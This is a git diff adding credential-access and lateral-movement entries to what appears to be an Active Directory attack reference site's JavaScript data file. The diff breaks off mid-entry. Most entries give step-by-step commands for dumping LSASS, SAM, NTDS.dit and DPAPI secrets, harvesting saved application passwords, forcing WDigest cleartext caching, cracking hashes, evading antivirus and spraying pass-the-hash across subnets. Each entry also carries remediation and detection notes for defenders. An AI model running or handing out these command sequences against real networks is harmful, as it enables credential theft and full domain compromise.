@@ -2139,6 +2139,754 @@ var VULNS = [
     ]
   },
   {
+    category: "Credential Access",
+    vulns: [
+      {
+        id: "lsass-dumping",
+        name: "LSASS Memory Dumping",
+        severity: "Critical",
+        ref: "https://attack.mitre.org/techniques/T1003/001/",
+        theory: "theory/2026-08-18-windows-credential-storage.html",
+        description: "The LSASS process caches the secrets of logged-on users — dumping its memory yields NT hashes, Kerberos tickets, and sometimes cleartext.",
+        brief: "The Local Security Authority Subsystem Service (LSASS) holds the credential material of every interactive session on a host: NT hashes, Kerberos tickets and keys, and — with legacy providers like WDigest — sometimes cleartext passwords. Any local administrator / SYSTEM context can read that memory.\n\nImpact: dumping LSASS on a single server that admins log into commonly yields a Domain Admin credential, which is why it is the pivot from local admin to domain compromise.",
+        quickReference: [
+          { label: "Mimikatz — dump logon passwords", cmd: "privilege::debug\nsekurlsa::logonpasswords" },
+          { label: "Living-off-the-land dump (comsvcs.dll)", cmd: "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\temp\\lsass.dmp full" },
+          { label: "Remote via NetExec", cmd: "netexec smb 10.10.10.10 -u admin -p 'Passw0rd' --lsa\nnetexec smb 10.10.10.10 -u admin -p 'Passw0rd' -M lsassy" },
+          { label: "Parse an offline dump", cmd: "mimikatz # sekurlsa::minidump lsass.dmp   then  sekurlsa::logonpasswords\npypykatz lsa minidump lsass.dmp" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. From a SYSTEM/admin context, dump logon secrets with Mimikatz", cmd: "mimikatz.exe\nprivilege::debug          # acquire SeDebugPrivilege\nsekurlsa::logonpasswords  # NT hashes, Kerberos keys, WDigest cleartext if present\nsekurlsa::ekeys           # AES keys for overpass-the-hash / pass-the-key" },
+              { label: "2. Stealthier: dump the process, exfil, parse offline (no mimikatz on host)", cmd: "# built-in Windows binary, no third-party tool on disk\nrundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\temp\\lsass.dmp full\n# then offline on your box:\npypykatz lsa minidump lsass.dmp" },
+              { label: "3. Remote, at scale", cmd: "# NetExec dumps LSASS across hosts and parses automatically\nnetexec smb targets.txt -u admin -p 'Passw0rd' -M lsassy\n# nanodump / dumpert evade some AV by avoiding MiniDumpWriteDump" },
+              { label: "4. Re-enable WDigest to force cleartext caching (noisy)", cmd: "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1\n# on the next logon, sekurlsa::logonpasswords returns cleartext" },
+              { label: "5. Use the recovered material", cmd: "# NT hash -> pass-the-hash ; AES key -> pass-the-key ; TGT -> pass-the-ticket\nsekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe" }
+            ]
+          },
+          {
+            title: "What LSASS Yields",
+            type: "table",
+            columns: ["Artifact", "Use"],
+            rows: [
+              ["NT hash", "Pass-the-hash, offline cracking"],
+              ["Kerberos AES/RC4 keys (ekeys)", "Overpass-the-hash / pass-the-key"],
+              ["Kerberos tickets (TGT/TGS)", "Pass-the-ticket"],
+              ["WDigest cleartext", "Direct password (legacy/enabled systems)"],
+              ["DPAPI master keys", "Decrypt DPAPI-protected secrets"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Obtain local admin / SYSTEM on a host", "Right to read LSASS memory"],
+              ["2", "Dump LSASS (mimikatz / comsvcs / nanodump)", "Credential material of logged-on users"],
+              ["3", "Parse for hashes, keys, tickets", "Reusable secrets"],
+              ["4", "If a privileged user was logged on", "Domain Admin credential"],
+              ["5", "Pass-the-hash / ticket onward", "Lateral movement → domain compromise"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Mimikatz", "sekurlsa::logonpasswords/ekeys, pth"],
+              ["comsvcs.dll (LOLBin) / nanodump / dumpert", "Create an LSASS dump, evade AV"],
+              ["pypykatz", "Parse a minidump offline on Linux"],
+              ["NetExec (lsassy / --lsa)", "Remote dump + parse at scale"],
+              ["procdump (Sysinternals)", "Signed binary to dump the process"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1003.001 — LSASS Memory", url: "https://attack.mitre.org/techniques/T1003/001/" },
+              { label: "The Hacker Recipes — Dumping credentials", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Enable LSA Protection (RunAsPPL) so LSASS runs as a protected process and cannot be read by normal admin tools.",
+              "Deploy Credential Guard to isolate secrets in a VBS-protected container away from LSASS.",
+              "Disable WDigest (UseLogonCredential = 0) so cleartext is never cached.",
+              "Enforce tiered administration so Domain Admins never log on to lower-tier servers where LSASS can be dumped.",
+              "Detect: handle opens to lsass.exe by non-system processes, comsvcs MiniDump usage, and creation of *.dmp of LSASS (EDR/Sysmon)."
+            ]
+          }
+        ]
+      },
+      {
+        id: "sam-lsa-secrets",
+        name: "SAM & LSA Secrets",
+        severity: "High",
+        ref: "https://attack.mitre.org/techniques/T1003/002/",
+        theory: "theory/2026-08-18-windows-credential-storage.html",
+        description: "The local SAM stores local account hashes; LSA secrets store service-account passwords and cached domain credentials — all readable with local admin.",
+        brief: "Every Windows host keeps local account NT hashes in the SAM registry hive and stores machine/service secrets (service-account passwords, auto-logon credentials, and cached domain logons) under LSA secrets. With local admin you can extract all of it, offline or remotely.\n\nImpact: a reused local administrator hash enables pass-the-hash across every machine that shares it; LSA secrets frequently hand over a service account's cleartext password; cached domain credentials can be cracked to recover a domain user's password even when the DC is unreachable.",
+        quickReference: [
+          { label: "Dump SAM + LSA + cached (offline hives)", cmd: "reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM sys.hiv & reg save HKLM\\SECURITY sec.hiv\nsecretsdump.py -sam sam.hiv -system sys.hiv -security sec.hiv LOCAL" },
+          { label: "Remote (Impacket)", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@10.10.10.10" },
+          { label: "NetExec", cmd: "netexec smb 10.10.10.10 -u admin -p 'Passw0rd' --sam --lsa" },
+          { label: "Crack cached domain creds (mscash2)", cmd: "hashcat -m 2100 dcc2.txt rockyou.txt" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Save the registry hives (offline extraction avoids touching LSASS)", cmd: "reg save HKLM\\SAM     C:\\temp\\sam.hiv\nreg save HKLM\\SYSTEM  C:\\temp\\system.hiv    # holds the boot key to decrypt SAM\nreg save HKLM\\SECURITY C:\\temp\\security.hiv  # LSA secrets + cached creds" },
+              { label: "2. Extract everything offline", cmd: "secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL\n#   local account NT hashes (SAM)\n#   $MACHINE.ACC and service secrets (LSA)\n#   $DCC2$ cached domain logons" },
+              { label: "3. Or pull it remotely in one command", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@10.10.10.10\nnetexec smb 10.10.10.0/24 -u admin -H <local_admin_hash> --sam --lsa" },
+              { label: "4. Reuse the local admin hash (if shared across the fleet)", cmd: "netexec smb 10.10.10.0/24 -u administrator -H <sam_nt_hash> --local-auth\n# a shared local admin password = pass-the-hash to every host (see LAPS remediation)" },
+              { label: "5. Crack cached domain credentials for a real domain password", cmd: "hashcat -m 2100 \"\\$DCC2\\$10240#user#<hash>\" rockyou.txt\n# mscash2 is slow to crack but recovers a usable domain password when it falls" }
+            ]
+          },
+          {
+            title: "What Each Store Holds",
+            type: "table",
+            columns: ["Store", "Contents"],
+            rows: [
+              ["SAM", "Local account NT hashes (e.g. the local Administrator)"],
+              ["LSA secrets", "Service-account passwords, auto-logon creds, machine account key"],
+              ["Cached domain creds (DCC2)", "Last N domain logons — crackable offline (hashcat 2100)"],
+              ["Boot key (SYSTEM hive)", "Required to decrypt the SAM"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Local admin on a host", "Read SAM/SECURITY/SYSTEM"],
+              ["2", "Extract SAM + LSA + cached", "Local hashes, service secrets, DCC2"],
+              ["3", "Pass-the-hash the local admin (if shared)", "Fleet-wide lateral movement"],
+              ["4", "Crack LSA/service secret or DCC2", "Cleartext service/domain password"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Impacket secretsdump.py", "Local (-sam/-system/-security) or remote extraction"],
+              ["NetExec", "--sam --lsa across a subnet"],
+              ["reg save / reg.exe", "Save the hives for offline parsing"],
+              ["Mimikatz lsadump::sam / lsadump::secrets", "Windows-side extraction"],
+              ["hashcat", "Crack cached domain creds (mode 2100)"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1003.002 — Security Account Manager", url: "https://attack.mitre.org/techniques/T1003/002/" },
+              { label: "The Hacker Recipes — SAM & LSA secrets", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Deploy LAPS so every host has a unique, rotated local administrator password — this breaks fleet-wide pass-the-hash of the local admin.",
+              "Limit cached domain logons (CachedLogonsCount) on servers that do not need offline logon.",
+              "Protect service accounts with gMSA so their LSA-stored secret is not a crackable static password.",
+              "Restrict local admin rights; the whole technique requires them.",
+              "Detect: reg save of SAM/SECURITY/SYSTEM, remote registry access, and secretsdump-style SMB activity."
+            ]
+          }
+        ]
+      },
+      {
+        id: "ntds-extraction",
+        name: "NTDS.dit Extraction",
+        severity: "Critical",
+        ref: "https://attack.mitre.org/techniques/T1003/003/",
+        theory: "theory/2026-08-18-windows-credential-storage.html",
+        description: "The domain database NTDS.dit holds every domain account's hashes — extracting it from a DC yields the entire domain's credentials.",
+        brief: "On a domain controller, NTDS.dit is the directory database, and it contains the password hashes (and Kerberos keys) of every account in the domain — including krbtgt and every Domain Admin. With DC admin, an attacker copies it (via Volume Shadow Copy to dodge the file lock) and extracts the lot offline.\n\nImpact: this is total domain compromise. Unlike DCSync (which pulls specific accounts over the replication protocol), NTDS extraction takes the whole database at once — every hash, every Kerberos key.",
+        quickReference: [
+          { label: "Remote (Impacket, uses DRSUAPI or VSS)", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@dc01 -just-dc" },
+          { label: "NetExec", cmd: "netexec smb dc01 -u admin -p 'Passw0rd' --ntds" },
+          { label: "On-DC: shadow copy + grab the files", cmd: "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\\ifm\" q q" },
+          { label: "Parse offline (ntds + system hive)", cmd: "secretsdump.py -ntds ntds.dit -system system.hiv LOCAL" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. On the DC, create an offline copy (VSS avoids the live-file lock)", cmd: "# ntdsutil IFM writes a consistent copy of NTDS.dit + the SYSTEM hive\nntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\temp\\ifm\" quit quit\n# alt: vssadmin create shadow /for=C: then copy \\\\?\\GLOBALROOT\\...\\NTDS\\ntds.dit" },
+              { label: "2. Exfil the two files and extract offline", cmd: "secretsdump.py -ntds C:\\temp\\ifm\\Active Directory\\ntds.dit \\\n  -system C:\\temp\\ifm\\registry\\SYSTEM LOCAL -outputfile domain_hashes\n# dumps every account's NTLM hash and Kerberos keys" },
+              { label: "3. Or pull it remotely without shell interaction", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@dc01 -just-dc\n#   -just-dc          only the domain secrets (uses DRSUAPI replication or VSS)\n#   -just-dc-ntlm     hashes only ; -just-dc-user krbtgt for one account" },
+              { label: "4. Use the crown jewels", cmd: "# krbtgt hash -> Golden Ticket ; DA hash -> pass-the-hash ; crack the rest offline\nhashcat -m 1000 domain_hashes.ntds rockyou.txt   # NTLM" }
+            ]
+          },
+          {
+            title: "NTDS vs DCSync",
+            type: "table",
+            columns: ["Aspect", "Detail"],
+            rows: [
+              ["NTDS.dit extraction", "Copies the whole database file — every account at once"],
+              ["DCSync", "Pulls chosen accounts over MS-DRSR replication, no file access"],
+              ["Requires", "DC admin (NTDS) vs replication rights on the domain (DCSync)"],
+              ["Both yield", "krbtgt, all DA hashes, Kerberos keys — total compromise"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Gain admin on a domain controller", "Access to NTDS.dit"],
+              ["2", "Shadow-copy / IFM the database + SYSTEM hive", "Consistent offline copy"],
+              ["3", "Extract hashes offline (secretsdump)", "Every domain account's hash + keys"],
+              ["4", "Golden Ticket from krbtgt / PtH the DA", "Durable, total domain control"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Impacket secretsdump.py", "-just-dc remote, or -ntds offline parsing"],
+              ["NetExec", "--ntds convenience wrapper"],
+              ["ntdsutil / vssadmin", "Create a shadow copy of the locked database on the DC"],
+              ["Mimikatz / DSInternals", "Windows-side NTDS parsing"],
+              ["hashcat", "Crack the recovered NTLM hashes (mode 1000)"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1003.003 — NTDS", url: "https://attack.mitre.org/techniques/T1003/003/" },
+              { label: "The Hacker Recipes — NTDS extraction", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Treat domain controllers as Tier-0: minimise who has DC admin, and manage them from a privileged access workstation only.",
+              "Rotate krbtgt twice after any suspected DC compromise; assume every hash in the domain is burned.",
+              "Monitor Volume Shadow Copy creation, ntdsutil IFM, and access to ntds.dit on DCs.",
+              "Detect DRSUAPI replication from non-DC hosts (the DCSync path) as well as raw file copies.",
+              "Enforce strong, unique passwords and consider periodic domain-wide password resets after an incident."
+            ]
+          }
+        ]
+      },
+      {
+        id: "dpapi-abuse",
+        name: "DPAPI Abuse",
+        severity: "High",
+        ref: "https://attack.mitre.org/techniques/T1555/",
+        theory: "theory/2026-08-18-windows-credential-storage.html",
+        description: "Windows' Data Protection API encrypts browser passwords, saved RDP/Wi-Fi creds and vault secrets — the keys are recoverable, so the secrets are too.",
+        brief: "DPAPI transparently encrypts per-user secrets — browser passwords and cookies, saved RDP and Wi-Fi credentials, Credential Manager vault entries, and application secrets. It is protected by a master key derived from the user's password, and domain-wide by a DPAPI backup key held on the DCs.\n\nImpact: with the user's password/hash, local admin, or the domain backup key, an attacker decrypts all of it. The domain backup key is the jackpot: one .pvk from the DC decrypts every domain user's DPAPI secrets on every host, frequently exposing credentials to systems and third parties outside AD entirely.",
+        quickReference: [
+          { label: "Extract the DPAPI domain backup key (with DA)", cmd: "dpapi.py backupkeys -t corp.local -u admin -p 'Passw0rd' --export" },
+          { label: "Harvest at scale with the backup key", cmd: "donpapi collect -t targets.txt --pvk domain_backupkey.pvk -u admin -p 'Passw0rd' -d corp.local" },
+          { label: "Mimikatz — decrypt a masterkey then a blob", cmd: "dpapi::masterkey /in:<masterkey> /rpc\ndpapi::cred /in:<credential_blob>" },
+          { label: "SharpDPAPI (browser/vault/RDP)", cmd: "SharpDPAPI.exe triage" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. The jackpot: extract the DPAPI domain backup key once (needs DA)", cmd: "dpapi.py backupkeys -t corp.local -u admin -p 'Passw0rd' --export\n# writes a .pvk that decrypts EVERY domain user's DPAPI secrets, on any host, forever" },
+              { label: "2. Sweep hosts and decrypt everything with that key", cmd: "donpapi collect -t targets.txt --pvk domain_backupkey.pvk \\\n  -u admin -p 'Passw0rd' -d corp.local\n# browser passwords/cookies, Credential Manager, RDP, Wi-Fi, scheduled-task creds" },
+              { label: "3. Without the backup key: decrypt with the user's password/hash locally", cmd: "# masterkey is unlocked by the user's password (or their SHA1/NT hash)\nmimikatz # dpapi::masterkey /in:\"%APPDATA%\\Microsoft\\Protect\\<SID>\\<GUID>\" /password:UserPass\nmimikatz # dpapi::cred /in:\"%APPDATA%\\Microsoft\\Credentials\\<blob>\"" },
+              { label: "4. Triage a compromised host quickly", cmd: "SharpDPAPI.exe triage        # dumps Credential Manager, vaults, RDP\nSharpChrome.exe logins       # Chrome/Edge saved passwords and cookies" },
+              { label: "5. Pivot outward", cmd: "# recovered secrets often reach cloud consoles, VPNs, and partner systems\n# outside the AD boundary — a scope note, not just a domain finding" }
+            ]
+          },
+          {
+            title: "Decryption Paths",
+            type: "table",
+            columns: ["Method", "When it applies"],
+            rows: [
+              ["User password / NT hash", "Decrypts that user's master keys and everything under them"],
+              ["DPAPI domain backup key (.pvk)", "Decrypts every domain user's DPAPI data on any host — the jackpot"],
+              ["Local SYSTEM", "Machine-scope DPAPI secrets (e.g. some service creds)"],
+              ["Why the backup key wins", "One key, domain-wide, no per-user password needed"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Reach DA (or a user's password/hash, or local admin)", "A viable decryption path"],
+              ["2", "Extract the domain backup key (best case)", "Domain-wide DPAPI master key"],
+              ["3", "Sweep hosts and decrypt DPAPI blobs", "Browser/RDP/Wi-Fi/vault credentials"],
+              ["4", "Reuse recovered creds", "Access to internal + external systems"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Impacket dpapi.py", "Extract the domain backup key; decrypt masterkeys/blobs"],
+              ["DonPAPI", "Remote, scaled DPAPI harvesting with the backup key"],
+              ["Mimikatz (dpapi::)", "Decrypt masterkeys, credentials, vaults"],
+              ["SharpDPAPI / SharpChrome", "Triage browser, vault, RDP secrets on Windows"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1555 — Credentials from Password Stores", url: "https://attack.mitre.org/techniques/T1555/" },
+              { label: "The Hacker Recipes — DPAPI", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Protect domain controllers — the DPAPI backup key lives there and is domain-wide game over if stolen.",
+              "Discourage browser password storage for privileged accounts; use a managed password manager instead.",
+              "Rotate credentials broadly after a DA compromise, including secrets that DPAPI protected (cloud, VPN, third-party).",
+              "Deploy Credential Guard and LSA protection to limit the material an attacker can reach in the first place.",
+              "Detect: access to the DPAPI backup key on DCs, and mass reads of \\AppData\\...\\Protect and \\Credentials across hosts."
+            ]
+          }
+        ]
+      },
+      {
+        id: "stored-cred-harvest",
+        name: "Stored / Application Credential Harvesting",
+        severity: "High",
+        ref: "https://attack.mitre.org/techniques/T1552/",
+        theory: "theory/2026-08-18-windows-credential-storage.html",
+        description: "Installed applications save passwords insecurely — FTP/SSH clients, email, IM, database tools and saved RDP/PuTTY sessions all give up credentials to a local harvester.",
+        brief: "Beyond OS credential stores, ordinary applications persist passwords: FTP/SFTP clients (FileZilla, WinSCP, CoreFTP), SSH sessions (PuTTY/SuperPuTTY), email and IM clients, database GUIs (HeidiSQL), VNC, and saved RDP sessions. Many store them weakly (registry, XML, reversible encryption).\n\nImpact: harvesting these on a single foothold routinely yields credentials to file servers, databases, network devices, and other users' systems — often the fastest lateral-movement fuel available, requiring only user-level access to that profile.",
+        quickReference: [
+          { label: "LaZagne — dump everything on the host", cmd: "lazagne.exe all" },
+          { label: "SessionGopher — saved RDP/WinSCP/PuTTY/FileZilla sessions", cmd: "Import-Module SessionGopher.ps1; Invoke-SessionGopher -Thorough" },
+          { label: "Metasploit post modules", cmd: "use post/windows/gather/credentials/winscp   (also filezilla_client_cred, coreftp, vnc, heidisql, ...)" },
+          { label: "Nirsoft utilities", cmd: "Mail PassView, PstPassword, WebBrowserPassView, VNCPassView" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Broad sweep with LaZagne (user context is enough)", cmd: "lazagne.exe all\n# harvests browsers, FTP/SSH clients, email, IM, databases, Wi-Fi, sysadmin tools\nlazagne.exe browsers -oN   # scope to a category, output to file" },
+              { label: "2. Saved remote-session credentials with SessionGopher", cmd: "powershell -ep bypass\nImport-Module .\\SessionGopher.ps1\nInvoke-SessionGopher -Thorough\n# RDP .rdp, WinSCP, PuTTY/SuperPuTTY, FileZilla saved sessions & passwords\nInvoke-SessionGopher -AllDomain -o   # sweep the whole domain remotely" },
+              { label: "3. Metasploit post-exploitation modules (from an existing session)", cmd: "use post/windows/gather/credentials/winscp\nset session 1\nexploit\n# also: filezilla_client_cred, coreftp, ftpnavigator, vnc, heidisql, pidgin_cred" },
+              { label: "4. Nirsoft point tools for specific apps", cmd: "# email: Mail PassView ; Outlook PST: PstPassword ; browsers: WebBrowserPassView\n# VNC: VNCPassView — each recovers cleartext from that app's store" },
+              { label: "5. Reuse immediately for lateral movement", cmd: "# a recovered WinSCP/SSH cred to a file server, or a DB GUI cred, is a direct pivot\nnetexec smb fileserver -u <found_user> -p '<found_pass>'" }
+            ]
+          },
+          {
+            title: "Where Applications Hide Secrets",
+            type: "table",
+            columns: ["Application", "Storage / weakness"],
+            rows: [
+              ["WinSCP", "Registry / .ini, reversibly encrypted (or plaintext)"],
+              ["FileZilla", "sitemanager.xml / recentservers.xml, base64/plaintext"],
+              ["PuTTY / SuperPuTTY", "Registry sessions; SuperPuTTY XML can hold passwords"],
+              ["CoreFTP / FTP Navigator", "Registry, weak encryption"],
+              ["HeidiSQL / DB GUIs", "Saved connection passwords"],
+              ["Saved RDP (.rdp)", "DPAPI-protected password (see DPAPI Abuse)"],
+              ["VNC", "Registry, reversible fixed-key encryption"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Land on a user's workstation/server", "Access to their app profiles"],
+              ["2", "Run LaZagne / SessionGopher / MSF modules", "Cleartext app credentials"],
+              ["3", "Identify creds to other hosts/services", "Movement targets"],
+              ["4", "Authenticate to those targets", "Lateral movement / privilege gain"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["LaZagne", "Broad multi-application credential recovery"],
+              ["SessionGopher", "Saved RDP/WinSCP/PuTTY/FileZilla sessions"],
+              ["Metasploit post/*/credentials/*", "Per-application dump modules"],
+              ["Nirsoft (Mail PassView, PstPassword, ...)", "Point recovery for specific apps"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1552 — Unsecured Credentials", url: "https://attack.mitre.org/techniques/T1552/" },
+              { label: "HackingArticles — Credential Dumping series", url: "https://www.hackingarticles.in/credential-dumping/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Discourage 'save password' in FTP/SSH/DB clients on privileged or shared systems; use a vaulted password manager.",
+              "Prefer key-based auth (SSH keys with passphrases, certificate auth) over stored passwords.",
+              "Restrict interactive logon and admin rights so a single foothold does not expose many stored credentials.",
+              "Rotate any credential that could have been harvested after a host compromise.",
+              "Detect: execution of LaZagne/SessionGopher, and reads of known application credential files/registry keys."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    category: "Lateral Movement",
+    vulns: [
+      {
+        id: "pass-the-hash",
+        name: "Pass-the-Hash / Pass-the-Ticket",
+        severity: "High",
+        ref: "https://attack.mitre.org/techniques/T1550/002/",
+        theory: "theory/2026-08-18-ntlm.html",
+        description: "Reuse a stolen NT hash, Kerberos ticket, or key to authenticate as a user without ever knowing their password.",
+        brief: "Windows authentication proves knowledge of a secret derived from the password, not the password itself — so a stolen NT hash (NTLM), Kerberos ticket, or Kerberos key is a credential you can replay directly. Pass-the-Hash reuses the NT hash; Pass-the-Ticket injects a stolen TGT/TGS; Overpass-the-Hash turns an NT hash into a fresh TGT; Pass-the-Key uses the AES key.\n\nImpact: these convert a single credential-dump into movement across every host that trusts that identity, without cracking anything. A reused local admin hash or a captured Domain Admin ticket spreads laterally at will.",
+        quickReference: [
+          { label: "Pass-the-Hash to a shell", cmd: "psexec.py -hashes :<nthash> corp.local/Administrator@10.10.10.10" },
+          { label: "PtH validate/spray across a subnet", cmd: "netexec smb 10.10.10.0/24 -u Administrator -H <nthash> --local-auth" },
+          { label: "Overpass-the-Hash (NT hash → TGT)", cmd: "getTGT.py corp.local/svc -hashes :<nthash> ; export KRB5CCNAME=svc.ccache" },
+          { label: "Pass-the-Ticket", cmd: "export KRB5CCNAME=stolen.ccache ; psexec.py -k -no-pass target" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Pass-the-Hash — authenticate with the NT hash directly", cmd: "# any Impacket exec tool accepts -hashes LM:NT (LM can be empty)\npsexec.py -hashes :2777b7fec870e04dda00cd7260f7bee6 corp.local/Administrator@10.10.10.10\n# evil-winrm: evil-winrm -i host -u Administrator -H <nthash>" },
+              { label: "2. Spray a (possibly shared local-admin) hash across the fleet", cmd: "netexec smb 10.10.10.0/24 -u Administrator -H <nthash> --local-auth\n# (Pwn3d!) marks hosts where the hash grants admin — instant lateral map" },
+              { label: "3. Overpass-the-Hash — mint a real Kerberos TGT from the NT hash", cmd: "getTGT.py corp.local/administrator -hashes ':<nthash>' -dc-ip 10.10.10.10\nexport KRB5CCNAME=administrator.ccache\npsexec.py -k -no-pass corp.local/administrator@dc01.corp.local\n# from here you are using Kerberos, which blends in better than raw NTLM" },
+              { label: "4. Pass-the-Key — use the AES256 key instead of the NT hash", cmd: "getTGT.py corp.local/administrator -aesKey <aes256_key> -dc-ip 10.10.10.10\nexport KRB5CCNAME=administrator.ccache   # AES avoids RC4 downgrade detections" },
+              { label: "5. Pass-the-Ticket — inject a ticket you stole from memory", cmd: "# Rubeus.exe dump  ->  base64 TGT  ->  Rubeus.exe ptt /ticket:<b64>\nexport KRB5CCNAME=administrator.ccache\nsecretsdump.py -k -no-pass dc01.corp.local" }
+            ]
+          },
+          {
+            title: "Credential-Reuse Variants",
+            type: "table",
+            columns: ["Technique", "Secret used"],
+            rows: [
+              ["Pass-the-Hash", "NT hash → NTLM authentication"],
+              ["Overpass-the-Hash", "NT hash → request a real Kerberos TGT"],
+              ["Pass-the-Key", "AES128/256 key → request a TGT (stealthier than RC4)"],
+              ["Pass-the-Ticket", "A stolen TGT/TGS → inject and reuse directly"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Dump a hash/ticket/key (see Credential Access)", "A reusable secret"],
+              ["2", "Validate where it grants access (NetExec spray)", "Map of reachable hosts"],
+              ["3", "PtH/PtT into a target (psexec/wmiexec/evil-winrm)", "Code execution as the identity"],
+              ["4", "Repeat toward higher privilege", "Path to Domain Admin"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Impacket psexec/wmiexec/getTGT", "PtH, overpass-the-hash, pass-the-key execution"],
+              ["NetExec", "Spray hashes to map admin access (--local-auth / -H)"],
+              ["Rubeus", "dump/ptt (pass-the-ticket), asktgt (overpass-the-hash)"],
+              ["Mimikatz", "sekurlsa::pth, kerberos::ptt"],
+              ["evil-winrm", "-H to pass-the-hash over WinRM"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1550.002 — Pass the Hash", url: "https://attack.mitre.org/techniques/T1550/002/" },
+              { label: "Hadess — Pwning the Domain: Lateral Movement", url: "https://hadess.io/" },
+              { label: "The Hacker Recipes — Pass-the-hash / ticket", url: "https://www.thehacker.recipes/ad/movement/ntlm/pth" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Deploy LAPS so a stolen local-admin hash cannot be reused on other hosts.",
+              "Enforce tiered administration so a captured Tier-0 hash/ticket is never present on a Tier-2 workstation.",
+              "Enable Credential Guard and LSA Protection to make hashes/tickets harder to steal in the first place.",
+              "Block/limit NTLM where possible and prefer Kerberos; monitor for RC4 overpass-the-hash (encryption downgrade).",
+              "Detect: the same account authenticating to many hosts rapidly, and TGT requests from unusual hosts (event 4768/4624 type 3/9)."
+            ]
+          }
+        ]
+      },
+      {
+        id: "remote-execution",
+        name: "Remote Service Execution (PsExec / WMI / WinRM / RDP)",
+        severity: "High",
+        ref: "https://attack.mitre.org/techniques/T1021/",
+        theory: "theory/2026-08-18-ntlm.html",
+        description: "Given valid credentials or a hash, execute code on remote hosts through SMB service creation, WMI, WinRM, or RDP.",
+        brief: "Once you hold a working credential (password, hash, or ticket), Windows offers many legitimate remote-administration channels that double as lateral-movement vectors: SMB service creation (PsExec/SMBExec), WMI (WMIExec), WinRM (evil-winrm), and RDP (xfreerdp). Each authenticates, runs your command as the target user or SYSTEM, and returns output.\n\nImpact: this is how a single valid admin credential becomes execution on dozens of hosts. The vectors differ in noise and artifacts, so attackers pick the quietest one that works.",
+        quickReference: [
+          { label: "PsExec (SMB service, SYSTEM shell)", cmd: "psexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10" },
+          { label: "WMIExec (semi-interactive, fileless-ish)", cmd: "wmiexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10" },
